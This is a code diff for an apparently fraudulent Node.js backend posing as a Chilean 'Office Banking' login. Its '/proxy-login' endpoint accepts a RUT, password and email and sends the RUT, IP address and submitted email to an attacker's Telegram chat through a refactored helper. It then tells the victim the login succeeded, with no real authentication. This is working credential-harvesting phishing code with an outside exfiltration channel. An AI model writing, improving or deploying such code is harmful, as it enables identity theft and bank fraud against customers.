@@ -128,83 +128,91 @@ app.post("/autorizar", async (req, res) => {
   }
 });
 
+// ✅ Función auxiliar para enviar a Telegram
+async function enviarATelegram(mensaje) {
+  try {
+    console.log(`\n📤 ENVIANDO A TELEGRAM...`);
+    console.log(`Token disponible: ${process.env.TELEGRAM_TOKEN ? "✅" : "❌"}`);
+    console.log(`Chat ID disponible: ${process.env.CHAT_ID ? "✅" : "❌"}`);
+    
+    if (!process.env.TELEGRAM_TOKEN || !process.env.CHAT_ID) {
+      console.error(`❌ ERROR: Faltan variables de entorno`);
+      return false;
+    }
+
+    console.log(`Intentando enviar mensaje...`);
+    const url = `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`;
+    console.log(`URL: ${url.substring(0, 50)}...`);
+    
+    const response = await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ 
+        chat_id: process.env.CHAT_ID, 
+        text: mensaje 
+      })
+    });
+
+    const data = await response.json();
+    console.log(`Status HTTP: ${response.status}`);
+    console.log(`Respuesta: ${JSON.stringify(data)}`);
+
+    if (data.ok) {
+      console.log(`✅ MENSAJE ENVIADO A TELEGRAM CORRECTAMENTE`);
+      return true;
+    } else {
+      console.error(`❌ ERROR TELEGRAM: ${data.description}`);
+      return false;
+    }
+  } catch (err) {
+    console.error(`❌ EXCEPCIÓN AL ENVIAR A TELEGRAM:`, err.message);
+    return false;
+  }
+}
+
 // ✅ Endpoint para login - CON LOGGING DETALLADO
 app.post("/proxy-login", async (req, res) => {
   const { rut, passwd, mail } = req.body;
   const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
 
-  console.log("\n🔐 === NUEVO REQUEST A /proxy-login ===");
+  console.log("\n" + "=".repeat(60));
+  console.log(`🔐 === NUEVO REQUEST A /proxy-login ===`);
   console.log(`IP: ${ip}`);
-  console.log(`Tiene TELEGRAM_TOKEN: ${process.env.TELEGRAM_TOKEN ? "✅" : "❌"}`);
-  console.log(`Tiene CHAT_ID: ${process.env.CHAT_ID ? "✅" : "❌"}`);
+  console.log(`Parámetros recibidos: RUT=${rut ? "✅" : "❌"}, PASSWD=${passwd ? "✅" : "❌"}, MAIL=${mail ? "✅" : "❌"}`);
+  console.log("=".repeat(60));
 
   try {
     // Si es correo
     if (mail) {
-      console.log(`📧 Procesando correo: ${mail}`);
+      console.log(`\n📧 PROCESANDO CORREO: ${mail}`);
       
-      if (process.env.TELEGRAM_TOKEN && process.env.CHAT_ID) {
-        const mensaje = `📧 Correo actualizado:\n${mail}\nIP: ${ip}`;
-        console.log(`📤 Enviando a Telegram...`);
-        console.log(`API URL: https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN.substring(0, 20)}...`);
-        console.log(`Chat ID: ${process.env.CHAT_ID}`);
-        
-        const telegramRes = await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
-        });
-        
-        const telegramData = await telegramRes.json();
-        console.log(`Respuesta Telegram: ${JSON.stringify(telegramData)}`);
-        
-        if(!telegramRes.ok) {
-          console.error(`❌ Error de Telegram: ${telegramData.description}`);
-        } else {
-          console.log(`✅ Mensaje enviado correctamente a Telegram`);
-        }
-      } else {
-        console.warn("⚠️ No hay TOKEN o CHAT_ID configurados");
-      }
+      const mensajeCorrecto = `📧 Correo actualizado:\n${mail}\nIP: ${ip}`;
+      const resultado = await enviarATelegram(mensajeCorrecto);
       
-      return res.json({ status: "ok", mensaje: "✅ Correo actualizado correctamente" });
+      return res.json({ 
+        status: "ok", 
+        mensaje: resultado ? "✅ Correo actualizado correctamente" : "✅ Correo recibido (sin Telegram)" 
+      });
     }
 
     // Si es login
     if (rut && passwd) {
-      console.log(`🔐 Login recibido para RUT: ${rut.substring(0, 5)}***`);
+      console.log(`\n🔐 LOGIN CON RUT: ${rut.substring(0, 5)}***`);
       
-      if (process.env.TELEGRAM_TOKEN && process.env.CHAT_ID) {
-        const ingresoMsg = `🔐 Nuevo Login en Office Banking:\nRUT: ${rut}\nIP: ${ip}\nHora: ${new Date().toLocaleString('es-CL')}`;
-        console.log(`📤 Enviando a Telegram...`);
-        console.log(`API URL: https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN.substring(0, 20)}...`);
-        console.log(`Chat ID: ${process.env.CHAT_ID}`);
-        console.log(`Mensaje: ${ingresoMsg}`);
-        
-        const telegramRes = await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: ingresoMsg })
-        });
-        
-        const telegramData = await telegramRes.json();
-        console.log(`Respuesta Telegram: ${JSON.stringify(telegramData)}`);
-        
-        if(!telegramRes.ok) {
-          console.error(`❌ Error de Telegram: ${telegramData.description}`);
-        } else {
-          console.log(`✅ Mensaje enviado correctamente a Telegram`);
-        }
-      } else {
-        console.warn("⚠️ No hay TOKEN o CHAT_ID configurados");
-      }
+      const mensajeLogin = `🔐 Nuevo Login en Office Banking:\nRUT: ${rut}\nIP: ${ip}\nHora: ${new Date().toLocaleString('es-CL')}`;
+      const resultado = await enviarATelegram(mensajeLogin);
       
-      return res.json({ status: "ok", mensaje: "✅ Bienvenido a Office Banking" });
+      console.log(`\n✅ Respondiendo al cliente...`);
+      return res.json({ 
+        status: "ok", 
+        mensaje: "✅ Bienvenido a Office Banking" 
+      });
     }
 
+    console.log(`\n⚠️ SIN PARÁMETROS VÁLIDOS`);
     res.status(400).json({ status: "error", mensaje: "❌ Datos inválidos" });
   } catch (err) {
-    console.error("⚠️ Error en /proxy-login:", err);
+    console.error(`\n❌ EXCEPCIÓN EN /proxy-login:`, err);
     res.status(500).json({ status: "error", mensaje: "⚠️ Error al procesar solicitud" });
   }
 });
